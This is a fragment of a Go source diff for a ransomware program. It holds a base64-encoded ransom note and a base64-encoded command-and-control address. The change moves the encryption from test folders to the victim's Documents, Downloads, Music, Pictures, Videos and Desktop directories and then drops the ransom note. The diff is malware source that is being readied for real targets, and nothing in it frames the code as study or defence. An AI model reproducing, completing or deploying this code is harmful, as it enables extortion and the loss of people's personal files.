@@ -18,8 +18,12 @@ import (
 
 const (
 	README string = "Desktop/README.txt"
-	NOTE   string = "WU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEICEhIQpEb24ndCBtYWtlIGFueSBzdHVwaWQgbW92ZSB0byBkZWNyeXB0IHRoZW0gb3IgZWxzZSB5b3Ugd2lsbCBoYXZlIHBlcm1hbmVudGx5IGxvc3QgYWNjZXNzIHRvIHRoZW0gISAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjClRPIFJFQ09WRVIgVEhFTSA6CkNvbnRhY3QgdXMgaGVyZSBhbmQgcHJvdmlkZSB0aGlzIGFzIHlvdXIgaWQgOgo="
 	C2     string = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLwo="
+	NOTE   string = "WU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEICEhIQpEb24ndCBtYWtlIGFueSBzdHVwaWQgbW92ZSB0byBkZWNyeXB0IHRoZW0gb3IgZWxzZSB5b3Ugd2lsbCBoYXZlIHBlcm1hbmVudGx5IGxvc3QgYWNjZXNzIHRvIHRoZW0gISAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjClRPIFJFQ09WRVIgVEhFTSA6CkNvbnRhY3QgdXMgaGVyZSBhbmQgcHJvdmlkZSB0aGlzIGFzIHlvdXIgaWQgOgo="
+)
+
+var (
+	TGT_DIRS = []string{"Documents", "Downloads", "Music", "Pictures", "Videos", "Desktop"}
 )
 
 func main() {
@@ -32,8 +36,9 @@ func main() {
 
 	// Encrypt the directories now :)
 	key := []byte(k)
-	encrypt_dir("Test1", []byte(key))
-	encrypt_dir("Test2", key)
+	for _, dir := range TGT_DIRS {
+		encrypt_dir(dir, key)
+	}
 
 	// Drop the Ransom Note
 	f, _ := os.Create(README)
